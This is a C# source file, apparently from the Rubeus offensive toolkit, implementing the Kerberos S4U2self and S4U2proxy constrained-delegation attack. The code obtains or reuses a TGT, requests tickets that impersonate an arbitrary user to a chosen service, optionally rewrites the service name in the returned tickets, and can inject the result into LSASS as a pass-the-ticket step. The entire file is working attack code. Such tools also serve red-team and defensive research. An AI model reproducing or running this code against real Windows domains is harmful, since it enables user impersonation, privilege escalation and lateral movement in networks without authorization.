using System;
using Asn1;

namespace Rubeus
{
    public class S4U
    {
        public static void Execute(string userName, string domain, string keyString,
            Interop.KERB_ETYPE etype, string targetUser, string targetSPN, bool ptt,
            string domainController = "", string altService = "")
        {
            // first retrieve a TGT for the user
            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, false, domainController);

            if (null == kirbiBytes) {
                Console.WriteLine("[X] Error retrieving a TGT with the supplied parameters");
                return;
            }
            Console.WriteLine("\r\n");
            // transform the TGT bytes into a .kirbi file
            KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
            // execute the s4u process
            Execute(kirbi, targetUser, targetSPN, ptt, domainController, altService);
        }

        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt,
            string domainController = "", string altService = "")
        {
            Console.WriteLine("[*] Action: S4U\r\n");
            // extract out the info needed for the TGS-REQ/S4U2Self execution
            string userName = kirbi.EncryptedPart.ticket_info[0].pname.name_string[0];
            string domain = kirbi.EncryptedPart.ticket_info[0].prealm;
            Ticket ticket = kirbi.Tickets[0];
            byte[] clientKey = kirbi.EncryptedPart.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.EncryptedPart.ticket_info[0].key.keytype;
            string dcIP = Networking.GetDCIP(domainController);

            if (String.IsNullOrEmpty(dcIP)) {
                return;
            }
            Console.WriteLine("[*] Building S4U2self request for: '{0}\\{1}'", domain, userName);
            Console.WriteLine("[*]   Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
            if (!string.IsNullOrEmpty(altService)) {
                string[] altSnames = altService.Split(',');
                Console.WriteLine((1 == altSnames.Length)
                    ? "[*]   Final ticket will be for the alternate service '{0}'"
                    : "[*]   Final tickets will be for the alternate services '{0}'",
                    altService);
            }
            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, userName, ticket, clientKey, etype,
                false, targetUser);
            Console.WriteLine("[*] Sending S4U2self request");
            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
            if (null == response) {
                return;
            }
            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);
            // check the response value
            int responseTag = responseAsn.TagValue;
            switch (responseTag) {
                case 13:
                    Console.WriteLine("[+] S4U2self success!");
                    // parse the response to an TGS-REP
                    TGS_REP rep = new TGS_REP(responseAsn);
                    // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
                    byte[] outBytes = Crypto.KerberosDecrypt(etype, 8, clientKey, rep.enc_part.cipher);
                    AsnElt ae = AsnElt.Decode(outBytes, false);
                    EncKDCRepPart encRepPart = new EncKDCRepPart(ae.FirstElement);
                    // TODO: ensure the cname contains the name of the user! otherwise s4u not supported
                    Console.WriteLine("[*] Building S4U2proxy request for service: '{0}'", targetSPN);
                    TGS_REQ s4u2proxyReq = new TGS_REQ();
                    PA_DATA padata = new PA_DATA(domain, userName, ticket, clientKey, etype);
                    s4u2proxyReq.padata.Add(padata);
                    PA_DATA pac_options = new PA_DATA(false, false, false, true);
                    s4u2proxyReq.padata.Add(pac_options);
                    s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CNAMEINADDLTKT;
                    s4u2proxyReq.req_body.realm = domain;
                    string[] parts = targetSPN.Split('/');
                    string serverName = parts[1];
                    s4u2proxyReq.req_body.sname.name_type = 2;
                    // the sname
                    s4u2proxyReq.req_body.sname.name_string.Add(parts[0]);
                    // the server
                    s4u2proxyReq.req_body.sname.name_string.Add(serverName);
                    // supported encryption types
                    s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
                    s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
                    s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
                    // add in the ticket from the S4U2self response
                    s4u2proxyReq.req_body.additional_tickets.Add(rep.ticket);
                    byte[] s4ubytes = s4u2proxyReq.Encode().Encode();
                    Console.WriteLine("[*] Sending S4U2proxy request");
                    byte[] response2 = Networking.SendBytes(dcIP, 88, s4ubytes);
                    if (null == response2) {
                        return;
                    }
                    // decode the supplied bytes to an AsnElt object
                    //  false == ignore trailing garbage
                    AsnElt responseAsn2 = AsnElt.Decode(response2, false);
                    // check the response value
                    int responseTag2 = responseAsn2.TagValue;
                    switch (responseTag2) {
                        case 13:
                            Console.WriteLine("[+] S4U2proxy success!");
                            // parse the response to an TGS-REP
                            TGS_REP rep2 = new TGS_REP(responseAsn2);
                            // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
                            EncKDCRepPart encRepPart2 = new EncKDCRepPart(
                                AsnElt.Decode(
                                    Crypto.KerberosDecrypt(etype, 8, clientKey, rep2.enc_part.cipher), false)
                                .FirstElement);
                            KRB_CRED cred;
                            KrbCredInfo info;
                            byte[] kirbiBytes;
                            if (!string.IsNullOrEmpty(altService)) {
                                string[] altSnames = altService.Split(',');
                                foreach (string altSname in altSnames) {
                                    // now build the final KRB-CRED structure with one or more alternate snames
                                    cred = new KRB_CRED();
                                    // since we want an alternate sname, first substitute it into the ticket structure
                                    rep2.ticket.sname.name_string[0] = altSname;
                                    // add the ticket
                                    cred.Tickets.Add(rep2.ticket);
                                    // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
                                    info = new KrbCredInfo();
                                    // [0] add in the session key
                                    info.key.keytype = encRepPart2.key.keytype;
                                    info.key.keyvalue = encRepPart2.key.keyvalue;
                                    // [1] prealm (domain)
                                    info.prealm = encRepPart2.realm;
                                    // [2] pname (user)
                                    info.pname.name_type = rep2.cname.name_type;
                                    info.pname.name_string = rep2.cname.name_string;
                                    // [3] flags
                                    info.flags = encRepPart2.flags;
                                    // [4] authtime (not required)
                                    // [5] starttime
                                    info.starttime = encRepPart2.starttime;
                                    // [6] endtime
                                    info.endtime = encRepPart2.endtime;
                                    // [7] renew-till
                                    info.renew_till = encRepPart2.renew_till;
                                    // [8] srealm
                                    info.srealm = encRepPart2.realm;
                                    // [9] sname
                                    info.sname.name_type = encRepPart2.sname.name_type;
                                    info.sname.name_string = encRepPart2.sname.name_string;
                                    // if we want an alternate sname, substitute it into the encrypted portion of the KRB_CRED
                                    Console.WriteLine("[*] Substituting alternative service name '{0}'", altSname);
                                    info.sname.name_string[0] = altSname;
                                    // add the ticket_info into the cred object
                                    cred.EncryptedPart.ticket_info.Add(info);
                                    kirbiBytes = cred.Encode().Encode();
                                    Helpers.DisplayKerberosTicket(kirbiBytes);
                                    if (ptt) {
                                        // pass-the-ticket -> import into LSASS
                                        LSA.ImportTicket(kirbiBytes);
                                    }
                                }
                                return;
                            }
                            // now build the final KRB-CRED structure, no alternate snames
                            cred = new KRB_CRED();
                            // if we want an alternate sname, first substitute it into the ticket structure
                            if (!string.IsNullOrEmpty(altService)) {
                                rep2.ticket.sname.name_string[0] = altService;
                            }
                            // add the ticket
                            cred.Tickets.Add(rep2.ticket);
                            // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
                            info = new KrbCredInfo();
                            // [0] add in the session key
                            info.key.keytype = encRepPart2.key.keytype;
                            info.key.keyvalue = encRepPart2.key.keyvalue;
                            // [1] prealm (domain)
                            info.prealm = encRepPart2.realm;
                            // [2] pname (user)
                            info.pname.name_type = rep2.cname.name_type;
                            info.pname.name_string = rep2.cname.name_string;
                            // [3] flags
                            info.flags = encRepPart2.flags;
                            // [4] authtime (not required)
                            // [5] starttime
                            info.starttime = encRepPart2.starttime;
                            // [6] endtime
                            info.endtime = encRepPart2.endtime;
                            // [7] renew-till
                            info.renew_till = encRepPart2.renew_till;
                            // [8] srealm
                            info.srealm = encRepPart2.realm;
                            // [9] sname
                            info.sname.name_type = encRepPart2.sname.name_type;
                            info.sname.name_string = encRepPart2.sname.name_string;
                            // add the ticket_info into the cred object
                            cred.EncryptedPart.ticket_info.Add(info);
                            kirbiBytes = cred.Encode().Encode();
                            Helpers.DisplayKerberosTicket(kirbiBytes);
                            if (ptt) {
                                // pass-the-ticket -> import into LSASS
                                LSA.ImportTicket(kirbiBytes);
                            }
                            return;
                        case 30:
                            // parse the response to an KRB-ERROR
                            Helpers.DisplayKerberosError(responseAsn);
                            return;
                        default:
                            Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
                            return;
                    }
                case 30:
                    // parse the response to an KRB-ERROR
                    Helpers.DisplayKerberosError(responseAsn);
                    return;
                default:
                    Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
                    return;
            }
        }
    }
}